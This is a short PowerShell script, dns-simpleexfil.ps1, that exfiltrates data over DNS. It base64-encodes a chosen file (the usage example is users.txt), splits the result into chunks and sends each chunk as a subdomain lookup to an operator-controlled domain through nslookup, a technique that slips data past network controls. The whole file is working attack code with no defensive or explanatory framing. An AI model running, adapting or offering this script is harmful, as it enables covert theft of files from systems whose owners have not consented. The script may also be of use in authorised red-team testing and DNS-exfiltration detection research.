<#
    .SYNOPSIS
    Example:
            .\dns-simpleexfil.ps1 file_to_exfil dns-server-name.com length_of_base64_string
    Usage:
            .\dns-simpleexfil.ps1 users.txt mydnsserver.com 34
#>

param(
    [string]$DataToSend,
    [string]$DNSToExfil,
    [int]$CharsLimit
)

if ([string]::IsNullOrEmpty($DataToSend) -and [string]::IsNullOrEmpty($DNSToExfil) -and [int]$CharsLimit -eq 0) {
    Write-Host "All parameters are empty. Please provide values for all parameters."
    return
}

if ($CharsLimit -eq 0 -or $CharsLimit -gt 40) {
    Write-Host "CharsLimit should be greater than 0 and less than or equal to 40."
    return
}

$DataOld = $DataToSend
$DataToSend = Get-ChildItem -Recurse -Path $DataToSend | ForEach-Object{$_.FullName}

if (-not [string]::IsNullOrEmpty($DataToSend) -and (Test-Path $DataToSend)) {
    $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($DataToSend))

    $partNumber = 0
    for ($i = 0; $i -lt $base64.Length; $i += $CharsLimit) {
        $partLength = [Math]::Min($CharsLimit, $base64.Length - $i)
        $part = $base64.Substring($i, $partLength)
        $part = $part -Replace '='
        $partNumber++
        $subdomain_exfiltration = "part$partNumber-$part.$DNSToExfil"
        Write-Host $subdomain_exfiltration
        nslookup $subdomain_exfiltration 2> $null > $null
    }
} else {
    Write-Host "The file does not exist at $DataOld"
    return
}
